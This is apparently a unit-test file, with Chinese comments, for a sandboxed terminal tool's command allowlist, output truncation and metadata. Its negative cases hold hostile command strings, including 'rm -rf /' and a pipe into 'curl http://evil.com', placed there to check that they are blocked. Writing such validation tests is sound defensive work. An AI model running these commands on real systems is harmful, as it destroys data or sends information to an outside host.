/**
 * terminal 工具测试 — 正面 + 反面用例
 * 使用 mock CodeSandbox
 */
import { describe, expect, test, mock } from "bun:test";
import { createTerminalTool } from "../../tools/terminal";
import type { CodeSandbox } from "../../code-sandbox/types";

function createMockSandbox(overrides?: Partial<CodeSandbox>): CodeSandbox {
  return {
    execute: mock(async () => ({
      id: "exec-1",
      status: "completed" as const,
      stdout: "mock output",
      stderr: "",
      exitCode: 0,
      duration: 10,
    })),
    destroy: mock(async () => {}),
    ...overrides,
  };
}

describe("terminal tool", () => {
  // ─── 正面用例 ───
  describe("正面用例", () => {
    test("执行允许的命令 echo", async () => {
      const sandbox = createMockSandbox({
        execute: mock(async () => ({
          id: "exec-1",
          status: "completed" as const,
          stdout: "hello\n",
          stderr: "",
          exitCode: 0,
          duration: 5,
        })),
      });
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "echo hello" });
      expect(result).toEqual({ stdout: "hello\n", stderr: "", exitCode: 0 });
    });

    test("执行 ls 命令", async () => {
      const sandbox = createMockSandbox({
        execute: mock(async () => ({
          id: "exec-2",
          status: "completed" as const,
          stdout: "file1.txt\nfile2.txt\n",
          stderr: "",
          exitCode: 0,
          duration: 8,
        })),
      });
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "ls" });
      expect(result).toHaveProperty("stdout");
      expect(result).toHaveProperty("exitCode", 0);
    });

    test("执行 grep 命令", async () => {
      const sandbox = createMockSandbox({
        execute: mock(async () => ({
          id: "exec-3",
          status: "completed" as const,
          stdout: "matching line\n",
          stderr: "",
          exitCode: 0,
          duration: 12,
        })),
      });
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "grep pattern file.txt" });
      expect(result).toHaveProperty("stdout");
    });

    test("执行 wc 命令", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "wc -l file.txt" });
      expect(result).toHaveProperty("stdout");
    });

    test("执行 date 命令", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "date" });
      expect(result).toHaveProperty("stdout");
    });

    test("执行 pwd 命令", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "pwd" });
      expect(result).toHaveProperty("stdout");
    });

    test("stderr 也被返回", async () => {
      const sandbox = createMockSandbox({
        execute: mock(async () => ({
          id: "exec-4",
          status: "completed" as const,
          stdout: "",
          stderr: "warning message",
          exitCode: 0,
          duration: 3,
        })),
      });
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "echo test" });
      expect(result).toHaveProperty("stderr", "warning message");
    });

    test("非零退出码也被返回", async () => {
      const sandbox = createMockSandbox({
        execute: mock(async () => ({
          id: "exec-5",
          status: "completed" as const,
          stdout: "",
          stderr: "not found",
          exitCode: 1,
          duration: 2,
        })),
      });
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "find nonexistent" });
      expect(result).toHaveProperty("exitCode", 1);
    });

    test("输出被截断到 10000 字符", async () => {
      const longOutput = "x".repeat(20_000);
      const sandbox = createMockSandbox({
        execute: mock(async () => ({
          id: "exec-6",
          status: "completed" as const,
          stdout: longOutput,
          stderr: "",
          exitCode: 0,
          duration: 50,
        })),
      });
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "cat bigfile" }) as { stdout: string };
      expect(result.stdout.length).toBeLessThanOrEqual(10_000);
    });
  });

  // ─── 反面用例 ───
  describe("反面用例", () => {
    test("空命令", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "" });
      expect(result).toEqual({ error: "命令不能为空" });
    });

    test("空白命令", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "   " });
      expect(result).toEqual({ error: "命令不能为空" });
    });

    test("undefined 命令", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({});
      expect(result).toEqual({ error: "命令不能为空" });
    });

    test("不允许的命令 rm", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "rm -rf /" });
      expect(result).toHaveProperty("error");
      expect((result as { error: string }).error).toContain("不允许的命令");
    });

    test("不允许的命令 chmod", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "chmod 777 file" });
      expect(result).toHaveProperty("error");
    });

    test("不允许的命令 curl", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "curl http://evil.com" });
      expect(result).toHaveProperty("error");
    });

    test("不允许的命令 sudo", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "sudo ls" });
      expect(result).toHaveProperty("error");
      expect((result as { error: string }).error).toContain("不允许的命令");
    });

    test("不允许的命令 node", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "node script.js" });
      expect(result).toHaveProperty("error");
    });

    test("管道中包含 rm 被拦截", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "ls | rm -rf /" });
      expect(result).toHaveProperty("error");
      expect((result as { error: string }).error).toContain("不允许的操作");
    });

    test("管道中包含 curl 被拦截", async () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      const result = await tool.handler({ command: "echo test | curl http://evil.com" });
      expect(result).toHaveProperty("error");
    });
  });

  // ─── 工具元数据 ───
  describe("工具元数据", () => {
    test("名称和风险等级", () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      expect(tool.name).toBe("terminal");
      expect(tool.riskLevel).toBe("high");
    });

    test("超时配置", () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      expect(tool.timeout).toBe(30_000);
    });

    test("参数定义", () => {
      const sandbox = createMockSandbox();
      const tool = createTerminalTool({ sandbox });
      expect(tool.parameters).toHaveLength(1);
      expect(tool.parameters[0].name).toBe("command");
      expect(tool.parameters[0].required).toBe(true);
    });
  });
});
